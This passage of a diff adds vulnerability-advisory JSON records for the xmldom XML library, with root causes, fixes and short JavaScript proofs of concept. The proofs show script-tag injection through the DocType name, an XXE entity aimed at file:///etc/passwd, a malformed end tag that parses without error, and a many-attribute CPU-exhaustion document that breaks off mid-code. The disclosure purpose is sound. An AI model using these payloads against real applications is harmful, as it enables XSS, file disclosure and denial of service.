there\n  is no well-formedness path at all.\n\n### Enabling write paths\n\n`DocumentType.name` is a plain, writable own-property, so the enabling vector\ndiffers by line:\n\n- **0.9.x** — `createDocumentType()` validates the name via\n  `validateQualifiedName` ([`lib/dom.js#L925-L936`](https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L925-L936),\n  validation at [#L926](https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L926)),\n  so the deliverable vector is a **direct property write**\n  (`dt.name = 'html><script>…'`) to the unguarded own-property.\n- **0.8.x** — `createDocumentType()` does **not** validate the name\n  ([`lib/dom.js#L456-L464`](https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom.js#L456-L464)),\n  so the malicious name is reachable directly through `createDocumentType()` as\n  well as via direct property write.\n- **unscoped `xmldom` (<= 0.6.0)** — `createDocumentType()` does not validate\n  the name ([`lib/dom.js#L286`](https://github.com/xmldom/xmldom/blob/c80a161172cc4d8733583bf0cf59abfa589f6d9e/lib/dom.js#L286)),\n  same as 0.8.x.\n\nThis is the same structural root cause the sibling name-injection advisories\nshare: the serializer's `requireWellFormed` path validates content delimiters\nbut no name field, and every name-like field is a plain writable property, so\nmutation / direct property-write bypasses any creation-time check.\n\n### Root Cause\n\n1. The serializer's `requireWellFormed` DocType block checks `publicId`,\n   `systemId`, and `internalSubset` (the fields hardened by GHSA-f6ww-3ggp-fr8h)\n   but has no check for `name`.\n2. `DocumentType.name` is a plain writable own-property; on 0.8.x and the\n   unscoped package `createDocumentType()` does not validate it either.\n3. The serializer emits `name` directly between the doctype delimiters:\n   `<!DOCTYPE ${name}…>`.\n\n## Proof of Concept\n\nRun against `@xmldom/xmldom` v0.9.10 (commit `bb7a085`):\n\n```javascript\nconst { DOMImplementation, XMLSerializer, DOMParser } = require('@xmldom/xmldom');\n\nconst impl = new DOMImplementation();\nconst serializer = new XMLSerializer();\n\n// 0.9.x createDocumentType validates the name, so overwrite it via direct property write\nconst dt = impl.createDocumentType('html', '', '');\ndt.name = 'html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script';\nconst doc = impl.createDocument(null, 'r', dt);\n\nconst output = serializer.serializeToString(doc, { requireWellFormed: true });\nconsole.log(output);\n// Output: <!DOCTYPE html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script><r/>\n//\n// requireWellFormed: true did NOT prevent the injection (no exception thrown).\n// The injected <script> is well-formed XHTML that a browser would execute.\n```\n\nConfirmed runtime behavior:\n\n- **0.9.x** — `createDocumentType()` rejects the malicious name at creation\n  (`InvalidCharacterError`); a direct write to `dt.name` bypasses that, and\n  `serializeToString(…, { requireWellFormed: true })` emits the breakout with no\n  exception.\n- **Re-parse confirmation** — re-parsing the output shows the injected\n  `<script>` is a real second top-level element originating entirely from the\n  DocType name: the parser rejects it with\n  `HierarchyRequestError: Only one element can be added and only after doctype`.\n  A comment-injection variant (`dt.name = 'html><!--INJECTED--'`, output\n  `<!DOCTYPE html><!--INJECTED--><r/>`) re-parses cleanly and the injected\n  comment node is enumerable, confirming the injected node is structurally live.\n- **0.8.x** (v0.8.13, `e5c1480`) — `createDocumentType('html><script>…', '', '')`\n  accepts the malicious name directly (no creation-time validation), and\n  `serializeToString(doc, null, null, { requireWellFormed: true })` produces\n  `<!DOCTYPE html><script>alert(1)</script><r/>` with no exception.\n\nA browser reproduction does not apply: browsers keep `DocumentType.name`\n`readonly`, so the direct-write vector cannot be reproduced in a browser DOM.\nThe injection is specific to xmldom exposing `name` as writable and serializing\nit without a guard.\n\n## Impact\n\nApplications that build a `DocumentType` node with an attacker-influenced\n`name` — via direct property write on any affected line, or via\n`createDocumentType()` on 0.8.x and the unscoped package — and serialize the\ndocument are vulnerable to XML/markup injection:\n\n- **XML structure injection** — breaking out of the `<!DOCTYPE …>` declaration\n  to inject arbitrary sibling elements, comments, or additional markup into the\n  output.\n- **XSS via XHTML** — if the serialized output is served as XHTML or processed\n  by a browser-based XML parser, an injected `<script>` element (in the XHTML\n  namespace) executes.\n- **requireWellFormed bypass** — applications that adopted\n  `requireWellFormed: true` as a mitigation for the prior injection CVEs\n  (including the sibling DocType fields fixed by GHSA-f6ww-3ggp-fr8h) remain\n  vulnerable through the DocType `name`.\n\n## Fix Applied\n\nUnder `requireWellFormed`, the serializer validates the DocType `name` as a well-formed XML\n`Name` and throws `InvalidStateError` when it is not — matching the sibling\n`publicId`/`systemId`/`internalSubset` checks. Non-breaking and opt-in; ships on both maintained versions. No\ncreation-time change is made: 0.9.x already validates the name at `createDocumentType`, and the\n0.8.x/unscoped creation gap cannot be closed without a breaking change, so it is left\nunfixed. See the [XML `Name` production](https://www.w3.org/TR/xml/#NT-Name).\n> **⚠ Opt-in required.** Protection is not automatic. Existing serialization calls remain\n> vulnerable unless `{ requireWellFormed: true }` is explicitly passed. Applications that\n> serialize untrusted DOM content should audit all `serializeToString()` call sites and add it.\n\n### Proof of Concept - fixed path\n\n```javascript\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst impl = new DOMImplementation();\nconst serializer = new XMLSerializer();\n\nconst dt = impl.createDocumentType('html', '', '');\ndt.name = 'html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script';\nconst doc = impl.createDocument(null, 'r', dt);\n\n// Default path: the ill-formed name is still emitted verbatim (injection present).\nconsole.log(serializer.serializeToString(doc));\n// <!DOCTYPE html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script><r/>\n\n// Opt-in path: serialization throws instead of emitting the breakout.\nserializer.serializeToString(doc, { requireWellFormed: true });\n// throws InvalidStateError\n```\n\n### Why the default stays verbatim\n\nW3C DOM Parsing's require-well-formed flag defaults to false, and the browser\n`XMLSerializer` emits the name verbatim in that default mode. Unconditionally\nthrowing would be an unjustified breaking change against that specified default,\nso the guard is opt-in behind `{ requireWellFormed: true }`.\n\n### Residual limitation\n\nThe default serialization path still emits the ill-formed DocType `name`\nverbatim; protection applies only when `requireWellFormed: true` is passed. No\ncreation-time validation is added for the DocType `name`: 0.9.x already validates\nat `createDocumentType`, and the 0.8.x/unscoped creation gap is left unfixed — it\ncannot be closed without a breaking change.",
+      "reported_by": null,
+      "title": "xmldom: DocType `name` Injection Bypasses requireWellFormed",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83608"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0 <=0.9.11",
+      "github_advisory_id": "GHSA-27p8-2357-5qqv",
+      "recommendation": "Upgrade to version 0.9.12 or later",
+      "patched_versions": ">=0.9.12",
+      "updated": "2026-09-08T21:02:54.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-91"
+      ],
+      "url": "https://github.com/advisories/GHSA-27p8-2357-5qqv"
+    },
+    "1193701": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-3px3-54cx-rmw9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83609\n- https://github.com/xmldom/xmldom/pull/1071\n- https://github.com/xmldom/xmldom/commit/7b2ec67e1750daadd0bb06c92e875e726544a362\n- https://github.com/xmldom/xmldom/releases/tag/0.9.12\n- https://github.com/advisories/GHSA-3px3-54cx-rmw9",
+      "created": "2026-09-08T21:02:33.000Z",
+      "id": 1193701,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nAn embedded line terminator bypasses xmldom's always-on, WHATWG-mandated creation-time name\nvalidation. `createElementNS`, `createAttributeNS`, `createDocumentType`, and `createAttribute` should\nreject a malformed qualified name with `InvalidCharacterError`, but a name whose first line is\nwell-formed slips through and enters the DOM. On serialization it is emitted verbatim, so the\ncharacters after the line terminator inject markup into the output. The injection reaches the default\nserialization path, and enabling `requireWellFormed` does not prevent it.\n\n## Details\n\n`createElementNS`, `createAttributeNS`, and `createDocumentType` route through `validateQualifiedName`,\nand `createAttribute` performs the analogous check; each validates the name with\n`g.QName_exact.test(name)`. `QName_exact = reg('^', QName, '$')` inherits the `m` flag from xmldom's\nshared regexp builder, so the matcher accepts any name whose first line is a valid `QName` and leaves\nthe remaining lines unconstrained (see Root Cause).\n\n### Root Cause\n\n1. A shared regexp builder compiles anchored productions with the `m` flag.\n2. `^…$` under `m` are line anchors, not string anchors.\n3. `validateQualifiedName` / `createAttribute` validate with `.test()` against such a production, so a\n   line terminator followed by breakout markup passes and the malformed name is stored.\n\nThe triggering line terminators are the ECMAScript `LineTerminator` set: U+000A, U+000D, U+2028, U+2029.\n\n## Proof of Concept\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\nconst impl = new DOMImplementation();\n\nconst doc = impl.createDocument('urn:x', 'root', null);\nconst el = doc.createElementNS('urn:x', 'a\\n><script>x</script');  // ACCEPTED (no throw)\ndoc.documentElement.appendChild(el);\n\n// DEFAULT serialization — requireWellFormed NOT set:\nconsole.log(new XMLSerializer().serializeToString(doc));\n// Observed: <root xmlns=\"urn:x\"><a\n// ><script>x</script/></root>          <-- injected element on the default path\n// Control: createElementNS('urn:x', 'bad>name') throws InvalidCharacterError, confirming the check is\n// active and specifically bypassed by the line terminator.\n```\n\n## Impact\n\n- **Bypass of the always-on WHATWG creation-time name validation** (`InvalidCharacterError`): a\n  malformed name the standard requires be rejected at creation is instead admitted to the DOM.\n- **Markup / structure injection.** An application relying on the `create*` APIs to reject malformed\n  names (the standard behavior) as a trust boundary is exposed; where the serialized output reaches an\n  HTML context, downstream XSS.\n- **No serializer option mitigates it.** The admitted name is emitted verbatim under *both* the default\n  path and `requireWellFormed: true` — the strict serializer shares the same `m`-flagged blind spot\n  (the subject of the sibling serializer advisories) — so the bypassed creation-time check was the only\n  layer that could have stopped it. Demonstrated for all four `create*` sites in\n  `poc_creation_strict_serialization_bypass.cjs`.\n\n## Fix Applied\n\n`createElementNS`, `createAttributeNS`, `createDocumentType`, and `createAttribute` now reject a name\ncontaining a line terminator with `InvalidCharacterError` — the same result they already give for\nother malformed names — because name validation now applies to the whole string. The\n`requireWellFormed` serializer's name checks are corrected by the same change. The fix is\nnon-breaking: such a name was already invalid, and no previously-accepted well-formed name is affected.",
+      "reported_by": null,
+      "title": "xmldom: Creation-time XML Name/QName validation is bypassable via an embedded line terminator, allowing injection on the default serialization path",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83609"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0 <=0.9.11",
+      "github_advisory_id": "GHSA-3px3-54cx-rmw9",
+      "recommendation": "Upgrade to version 0.9.12 or later",
+      "patched_versions": ">=0.9.12",
+      "updated": "2026-09-08T21:02:34.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-91",
+        "CWE-625"
+      ],
+      "url": "https://github.com/advisories/GHSA-3px3-54cx-rmw9"
+    },
+    "1193702": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-vr34-hp96-76pp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83618\n- https://github.com/xmldom/xmldom/pull/1071\n- https://github.com/xmldom/xmldom/commit/7b2ec67e1750daadd0bb06c92e875e726544a362\n- https://github.com/xmldom/xmldom/releases/tag/0.9.12\n- https://github.com/advisories/GHSA-vr34-hp96-76pp",
+      "created": "2026-09-08T21:02:25.000Z",
+      "id": 1193702,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nAn embedded line terminator bypasses the `requireWellFormed` serializer check for a `DocumentType`'s\npublicId and systemId. The check was added to fix GHSA-f6ww-3ggp-fr8h; an id whose first line is a\nvalid literal slips past it and is emitted verbatim into the `<!DOCTYPE …>` declaration, so the markup\nafter the line terminator breaks out into the surrounding document. Callers who enabled\n`requireWellFormed` to neutralize DocumentType injection remain exposed.\n\n## Details\n\n`publicId` and `systemId` are stored as raw values **including their surrounding quotes**, and the\n`PubidLiteral`/`SystemLiteral` productions include those quotes. The serializer validates them with\n`g.PubidLiteral_match.test(publicId)` and `g.SystemLiteral_match.test(systemId)`, where both matchers\nare `reg('^', …, '$')` and inherit the `m` flag from xmldom's shared regexp builder. Under `m`, `$`\nmatches at an interior line terminator, so a value such as `\"valid pubid\"\\n\"><!ENTITY …>` satisfies\nthe matcher on its first line (`\"valid pubid\"` is a complete `PubidLiteral`) and the whole value —\nincluding the post-newline breakout — is emitted after `PUBLIC`/`SYSTEM`.\n\n### Root Cause\n\n1. A shared regexp builder compiles anchored productions with the `m` flag.\n2. `^…$` under `m` are line anchors, not string anchors.\n3. A full-string validator built on such a production (`.test()`) accepts any string with one\n   conforming line, so a complete, valid literal on the first line passes even though a line terminator\n   and breakout markup follow. `PubidChar` excluding `<`/`>` does not prevent it — the breakout is\n   appended *after* the literal, not embedded inside it.\n\nThe triggering line terminators are the ECMAScript `LineTerminator` set: U+000A, U+000D, U+2028, U+2029.\n\n## Affected Versions\n\nOnly `@xmldom/xmldom` 0.9.x is affected. The vulnerable matchers are built by `lib/grammar.js`'s\n`m`-flagged `reg()` builder, and the DocType `publicId`/`systemId` `requireWellFormed` check that\nconsumes them was introduced in 0.9.10 (the GHSA-f6ww-3ggp-fr8h fix); 0.9.10 and 0.9.11 carry it.\n`0.8.x` performs the same `requireWellFormed` check with inline, non-`m` regular expressions and is not\naffected. The unscoped `xmldom` package has no `grammar.js` and no `requireWellFormed` serializer, so\nthere is no check to bypass.\n\n## Proof of Concept\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\nconst impl = new DOMImplementation();\n\n// publicId: complete literal on line 1, then newline + breakout\nconst dt = impl.createDocumentType('html', '\"valid pubid\"\\n\"><!ENTITY xxe SYSTEM \"file:///etc/passwd\">', '');\nconst doc = impl.createDocument(null, 'root', dt);\nconsole.log(new XMLSerializer().serializeToString(doc, { requireWellFormed: true }));\n// Observed (no throw):\n//   <!DOCTYPE html PUBLIC \"valid pubid\"\n//   \"><!ENTITY xxe SYSTEM \"file:///etc/passwd\">><root/>\n// Expected: InvalidStateError (publicId is not a valid PubidLiteral).\n// Control: a single-line invalid publicId (\"no-surrounding-quotes<>\") DOES throw InvalidStateError,\n// confirming the check is active and specifically bypassed by the line terminator.\n```\n\n## Impact\n\n- **Bypass of the GHSA-f6ww-3ggp-fr8h mitigation.** Applications that adopted `requireWellFormed:\n  true` to neutralize DocumentType injection remain exposed.\n- **XML structure injection into the DOCTYPE**, including injected markup / entity declarations after\n  the public or system identifier.\n\n## Fix Applied\n\nThe anchored `PubidLiteral`/`SystemLiteral` validators used by the `requireWellFormed`\nserializer no longer treat an interior line terminator as satisfying the `$` anchor, so a `publicId`\nor `systemId` containing any ECMAScript `LineTerminator` (U+000A, U+000D, U+2028, U+2029) is rejected\nwith `InvalidStateError`. Valid single-line identifiers serialize unchanged, and the default\nserialization path is unaffected.\n\n> **⚠ Opt-in required.** Protection is not automatic. Existing serialization calls remain vulnerable\n> unless `{ requireWellFormed: true }` is explicitly passed. Applications that serialize untrusted DOM\n> content should audit all `serializeToString()` call sites and add it.\n\n### Proof of Concept - fixed path\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\nconst impl = new DOMImplementation();\nconst dt = impl.createDocumentType('html', '\"valid pubid\"\\n\"><!ENTITY xxe SYSTEM \"file:///etc/passwd\">', '');\nconst doc = impl.createDocument(null, 'root', dt);\n\n// Default path (requireWellFormed off) — unchanged, still emits verbatim:\nconsole.log(new XMLSerializer().serializeToString(doc));\n//   <!DOCTYPE html PUBLIC \"valid pubid\"\n//   \"><!ENTITY xxe SYSTEM \"file:///etc/passwd\">><root/>\n\n// Opt-in path — now throws instead of emitting the breakout:\nnew XMLSerializer().serializeToString(doc, { requireWellFormed: true });\n//   InvalidStateError: DocumentType publicId is not a valid PubidLiteral\n```\n\n### Why the default stays verbatim\n\nThe W3C DOM Parsing \"require well-formed\" flag defaults to false, and a browser `XMLSerializer` emits\nthe DOCTYPE verbatim. Unconditionally throwing on a malformed `publicId`/`systemId` would be an\nunjustified breaking change to the default path, so the fix tightens only the opt-in\n`requireWellFormed` validator, matching browser and spec defaults.\n\n### Residual limitation\n\nThe guarantee holds only for callers that pass `{ requireWellFormed: true }`; the default\nserialization path still emits `publicId`/`systemId` verbatim. `publicId` and `systemId` are not\nvalidated at creation (`createDocumentType`) or on direct property assignment\n(`documentType.publicId = …`) — the WHATWG DOM specification places no well-formedness constraint on\nthese fields at creation time, so the serializer is the spec-aligned enforcement point.",
+      "reported_by": null,
+      "title": "xmldom: requireWellFormed DocType publicId/systemId validation is bypassable via an embedded line terminator",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83618"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.10 <=0.9.11",
+      "github_advisory_id": "GHSA-vr34-hp96-76pp",
+      "recommendation": "Upgrade to version 0.9.12 or later",
+      "patched_versions": ">=0.9.12",
+      "updated": "2026-09-08T21:02:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-91",
+        "CWE-625"
+      ],
+      "url": "https://github.com/advisories/GHSA-vr34-hp96-76pp"
+    },
+    "1193704": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-6h8r-xr42-gp59\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83611\n- https://github.com/xmldom/xmldom/pull/1071\n- https://github.com/xmldom/xmldom/pull/1072\n- https://github.com/xmldom/xmldom/commit/4430189660b0d380ee9c9ee7550a1358688e8828\n- https://github.com/xmldom/xmldom/commit/7b2ec67e1750daadd0bb06c92e875e726544a362\n- https://github.com/xmldom/xmldom/releases/tag/0.8.15\n- https://github.com/xmldom/xmldom/releases/tag/0.9.12\n- https://github.com/advisories/GHSA-6h8r-xr42-gp59",
+      "created": "2026-09-08T21:02:13.000Z",
+      "id": 1193704,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nxmldom's parser silently accepts a **not-well-formed end tag** whose valid name is followed by\ntrailing content — e.g. `</a⏎junk>`. The element is closed, the trailing content is discarded, and no\nerror is reported, even though the XML end-tag production allows only optional whitespace after the\nname and both Chromium and Firefox reject such input as `application/xml`. An application that relies\non xmldom to reject not-well-formed input therefore receives a false \"valid\" result for a document the\nspecification and browsers consider malformed.\n\n## Details\n\nAcross every affected version, an end tag whose valid `Name` is followed by trailing content before\n`>` is silently accepted: the element is closed, the residue is dropped, and no error is reported. How\nmuch leaks differs by line (see Affected Versions), but the observable weakness is the same.\n\nOn the current (`0.9.x`) line, the parser validates the end-tag name against the XML `ETag` production\nwith an anchored regular expression (`^ QName S? $`). That expression is compiled with the `m`\n(multiline) flag by a shared builder, so `$` matches at an interior line terminator: a valid name on\nthe first line satisfies the anchored production and any content after the line break escapes the\ncheck. On 0.9.x the whitespace-separated variant (`</a junk>`) is already rejected; only the\nline-terminator variant leaks. Older lines have no anchored end-tag validator at all, so they accept\nboth the line-terminator and the whitespace variant.\n\nThis is **not** content injection — the trailing content is dropped, and the resulting DOM is a normal\nsingle-root document (`<a/>`). The security-relevant property is the silent acceptance of\nnot-well-formed input: xmldom's parse result disagrees with the specification and with browser XML\nparsers, so any control that treats \"xmldom parsed it without error\" as \"well-formed\" is bypassed.\n\n### Root Cause\n\nOn the `0.9.x` line, where the line-terminator variant specifically leaks:\n\n1. A shared regexp builder compiles anchored productions with the `m` flag.\n2. `^…$` under `m` are line anchors, not string anchors.\n3. The anchored end-tag production `^ QName S? $` is therefore satisfied by the first line alone, so\n   trailing content after a line terminator is neither matched nor rejected — the malformed end tag is\n   accepted and the residue silently discarded.\n\nThe triggering line terminators are the ECMAScript `LineTerminator` set: U+000A, U+000D, U+2028, U+2029.\nU+2028 and U+2029 are not XML whitespace, so they are non-conforming trailing content that nonetheless\nleaks because the JavaScript `$` anchor treats them as line boundaries under `m`.\n\n## Affected Versions\n\nBoth maintained versions are affected and fixed:\n\n- **`0.9.x`** (`>= 0.9.0, <= 0.9.11`) → **`0.9.12`**: the anchored end-tag validator's `m` flag leaks\n  the line-terminator variant. The whitespace variant (`</a junk>`) is already rejected on this line.\n- **`0.8.x`** (`>= 0.8.0, <= 0.8.14`) → **`0.8.15`**: no anchored end-tag validator at all — both the\n  line-terminator and the whitespace variant are silently accepted; the fix adds a residue check.\n\n`release-0.7.x` (`<= 0.7.13`) and the unscoped `xmldom` package (range `*`, last release 0.6.0) are\n**affected but will not be patched** — they are end-of-life / unmaintained. They share the older-line\nbehavior (both variants silently accepted, residue dropped).\n\n## Proof of Concept\n\n```js\nconst { DOMParser, XMLSerializer } = require('@xmldom/xmldom');\nconst doc = new DOMParser().parseFromString('<a></a\\njunk>', 'text/xml'); // no error\nconsole.log(new XMLSerializer().serializeToString(doc));\n// Observed: <a/>   — the malformed end tag is accepted, \"junk\" silently discarded, no error reported.\n// Expected (per XML spec / Chromium / Firefox): a parse error — the input is not well-formed.\n```\n\n## Impact\n\n- **Silent acceptance of not-well-formed XML**: a document the specification and browser XML parsers\n  reject is parsed without error.\n- **Bypass of a well-formedness / parse-before-trust gate**: an application relying on xmldom to\n  reject malformed input treats such a document as valid. Note this is an input-validation /\n  parser-differential issue, not content injection — the trailing content is discarded.\n\n## Fix Applied\n\nThe parser now reports a not-well-formed end tag whose valid name is followed by trailing content, on both `0.9.12` and `0.8.15` — previously it was accepted silently — and parsing recovers to the byte-identical DOM as before.\\\nOn `0.9.12` the anchored end-tag validator is corrected so a line break followed by trailing content no longer satisfies it, reported as a recoverable `error` when parsing as XML and a `warning` when parsing as HTML.\\\nOn `0.8.15`, which previously performed no end-tag residue validation, an equivalent residue check is added, reported as a recoverable `error` in both XML and HTML.\\\nWell-formed documents are unaffected.\n\nBecause the report is recoverable, the fix is non-breaking: no previously-parsed document begins to\nthrow and no serialized output changes. Consumers that want strict rejection can escalate the reported\n`error` to a fatal one via the parser's error handler (`onError` in `0.9.12`, `errorHandler` in\n`0.8.15`). The two versions also differ in the whitespace-separated variant (`</a junk>`): `0.9.12`\nalready rejected it with a fatal error in XML and continues to, while `0.8.15` — which validated\nneither variant — now emits the same recoverable report for both the whitespace and line-break\nvariants.\n\n### Residual limitation\n\nBy default the parser still **recovers** (it does not reject the document); the reported condition is a\nrecoverable `error`/`warning`, not a fatal error, to avoid changing the parsed output in a patch\nrelease. Converting this and the other not-well-formed-acceptance cases to a consistent `fatalError` —\nincluding the broader end-tag leniency on the older versions — is deferred to the next breaking release,\ntracked at [xmldom/xmldom#1074](https://github.com/xmldom/xmldom/issues/1074).",
+      "reported_by": null,
+      "title": "xmldom: Parser silently accepts a not-well-formed end tag whose name is followed by a line break and trailing content",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83611"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0 <=0.9.11",
+      "github_advisory_id": "GHSA-6h8r-xr42-gp59",
+      "recommendation": "Upgrade to version 0.9.12 or later",
+      "patched_versions": ">=0.9.12",
+      "updated": "2026-09-08T21:02:13.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1286"
+      ],
+      "url": "https://github.com/advisories/GHSA-6h8r-xr42-gp59"
+    },
+    "1193707": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-27p8-2357-5qqv\n- https://github.com/xmldom/xmldom/security/advisories/GHSA-8344-3jmq-59r6\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83613\n- https://github.com/xmldom/xmldom/pull/1071\n- https://github.com/xmldom/xmldom/pull/1072\n- https://github.com/xmldom/xmldom/commit/2c548f200cfec991cd5846627ef8f03542309213\n- https://github.com/xmldom/xmldom/commit/cfb09b5dbeb035fdfedc9f01e2bbaf226bf47cf3\n- https://github.com/xmldom/xmldom/releases/tag/0.8.15\n- https://github.com/xmldom/xmldom/releases/tag/0.9.12\n- https://github.com/advisories/GHSA-8344-3jmq-59r6",
+      "created": "2026-09-08T21:01:31.000Z",
+      "id": 1193707,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nxmldom builds the attribute collection of every parsed element by inserting attributes one at a\ntime into a DOM `NamedNodeMap`. Each insertion first performs a **linear scan of all\nalready-inserted attributes** to enforce the DOM uniqueness rule (no two attributes with the same\nqualified name / namespace+local-name). Parsing an element that carries `M` distinct attributes\ntherefore costs `1 + 2 + … + M = O(M²)` comparisons.\n\nBecause the trigger is simply \"one element with many attributes\", the attack payload is a\n**fully well-formed XML document**. No malformed markup, no error recovery, and no non-default\nparser options are involved — parsing completes silently with zero `warning`/`error`/`fatalError`\nevents. An attacker who can submit a modest, highly compressible document (a single element with\ntens of thousands of attributes, ~340 KB uncompressed) can consume seconds of single-threaded CPU\nper request, enabling an unauthenticated denial of service.\n\nThis is distinct from the known quadratic-**memory** namespace-map issue: it burns **CPU** and it\ndoes not require any namespace declarations or nesting.\n\n## Details\n\nThe DOM content handler adds each attribute of a starting element by calling\n`el.setAttributeNode(attr)` in a loop:\n\n```js\n// DOMHandler.startElement\nfor (var i = 0; i < len; i++) {\n\tvar namespaceURI = attrs.getURI(i);\n\tvar value = attrs.getValue(i);\n\tvar qName = attrs.getQName(i);\n\tvar attr = doc.createAttributeNS(namespaceURI, qName);\n\tattr.value = attr.nodeValue = value;\n\tel.setAttributeNode(attr);          // O(existing attrs) each — see below\n}\n```\n\nhttps://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom-parser.js#L370-L387\n\n`setAttributeNode` delegates to `NamedNodeMap.setNamedItem`, which calls `getNamedItemNS` to look\nfor an existing attribute with the same namespace URI and local name before appending:\n\n```js\nsetNamedItem: function (attr) {\n\tvar el = attr.ownerElement;\n\tif (el && el !== this._ownerElement) {\n\t\tthrow new DOMException(DOMException.INUSE_ATTRIBUTE_ERR);\n\t}\n\tvar oldAttr = this.getNamedItemNS(attr.namespaceURI, attr.localName);  // linear scan\n\tif (oldAttr === attr) {\n\t\treturn attr;\n\t}\n\t_addNamedNode(this._ownerElement, this, attr, oldAttr);\n\treturn oldAttr;\n},\n```\n\nhttps://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L612-L623\n\n`getNamedItemNS` walks the whole list on every call:\n\n```js\ngetNamedItemNS: function (namespaceURI, localName) {\n\tif (!namespaceURI) {\n\t\tnamespaceURI = null;\n\t}\n\tvar i = 0;\n\twhile (i < this.length) {\n\t\tvar node = this[i];\n\t\tif (node.localName === localName && node.namespaceURI === namespaceURI) {\n\t\t\treturn node;\n\t\t}\n\t\ti++;\n\t}\n\treturn null;\n},\n```\n\nhttps://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L702-L715\n\nFor the i-th attribute the scan visits `i-1` entries, so inserting `M` distinct attributes performs\n`Θ(M²)` comparisons. There is no hash index or set keyed by name; the map is a plain\narray-backed structure.\n\nThe same structure exists on 0.8.x. There `setNamedItem` dedups via\n`getNamedItem(attr.nodeName)` instead of `getNamedItemNS`, but that method is likewise a full linear\nscan, so the complexity is identical:\n\n- `startElement` loop / `setAttributeNode`:\n  https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom-parser.js#L159-L176\n- `setNamedItem` → linear `getNamedItem`:\n  https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom.js#L286-L308\n\nThe linear-scan `NamedNodeMap` predates the `@xmldom/xmldom` fork and is present unchanged in the\nunscoped `xmldom` package back to its earliest published release. In `xmldom@0.1.0`, parsing already\ninserts each attribute one at a time (`DOMHandler.startElement` loops calling\n`setAttributeNS` → `setAttributeNode` → `NamedNodeMap.setNamedItem`), and `setNamedItem` dedups by\ncalling `getNamedItemNS`, which is a full linear `while (i--)` scan of the already-inserted\nattributes — the identical `O(M²)` structure. The whole unscoped line (`0.1.0` … `0.6.0`) is\ntherefore affected; the earliest published tag (`0.1.0`) was verified to contain the per-insert\nlinear dedup scan.\n\n## Proof of Concept\n\nA single well-formed element with `M` distinct attributes. No malformed markup and no options:\n\n```js\n'use strict';\nvar DOMParser = require('@xmldom/xmldom').DOMParser;\n\nfunction buildDoc(m) {\n\tvar parts = new Array(m);\n\tfor (var i = 0; i < m; i++) parts[i] = 'a' + i + '=\"x\"';\n\treturn '<r ' + parts.join(' ') + '/>';   // <r a0=\"x\" a1=\"x\" ... a{M-1}=\"x\"/>\n}\n\nfor (var _i = 0, sizes = [2000, 4000, 8000, 16000, 32000]; _i < sizes.length; _i++) {\n\tvar m = sizes[_i];\n\tvar xml = buildDoc(m);\n\tvar 